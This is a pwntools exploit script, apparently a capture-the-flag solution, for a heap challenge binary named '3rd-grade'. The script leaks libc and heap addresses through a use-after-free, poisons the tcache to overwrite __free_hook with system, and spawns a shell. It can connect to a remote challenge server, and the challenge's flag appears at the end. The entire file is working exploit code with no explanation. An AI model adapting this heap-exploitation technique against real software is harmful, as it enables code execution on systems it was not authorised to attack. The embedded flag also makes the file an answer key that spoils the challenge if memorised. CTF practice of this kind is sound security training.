from pwn import *

libc = ELF("./libc.so.6")

context.terminal = ["kitty"]
if args.GDB:
    p = gdb.debug("./3rd-grade", gdbscript="c")
elif args.REMOTE:
    p = remote("0.cloud.chals.io", 21371)
else:
    p = process("./3rd-grade")

def make(index, size):
    p.sendlineafter(b":", b"1")
    p.sendlineafter(b"?", str(index).encode())
    p.sendlineafter(b"?", str(size).encode())

def edit(index, data):
    p.sendlineafter(b":", b"2")
    p.sendlineafter(b"?", str(index).encode())
    p.sendlineafter(b"?", data)

def free(index):
    p.sendlineafter(b":", b"3")
    p.sendlineafter(b"?", str(index).encode())

def view(index):
    p.sendlineafter(b":", b"4")
    p.sendlineafter(b"?", str(index).encode())
    p.recvline()
    return p.recvline()[:-1]

make(69, 0)
make(0, 0x1000)
make(1, 0)
free(0)
make(2, 0x2000)

leak = u64(view(0).ljust(8, b"\x00"))
base = leak - 0x1e4220
target = base + libc.sym.__free_hook
log.info(f"leak: 0x{leak:x}")
log.info(f"base: 0x{base:x}")
log.info(f"target: 0x{target:x}")

free(69)
leak = u64(view(69).ljust(8, b"\x00"))
log.info(f"leak: 0x{leak:x}")

make(0, 32)
make(1, 32)
make(69, 32)
free(0)
free(1)
edit(1, p64(target ^ leak))
make(0, 32)
make(1, 32)
edit(1, p64(base + libc.sym.system))
edit(69, b"/bin/sh\x00")
free(69)

p.interactive()

# UDCTF{RuN_f0ResT_ruNnNnNn}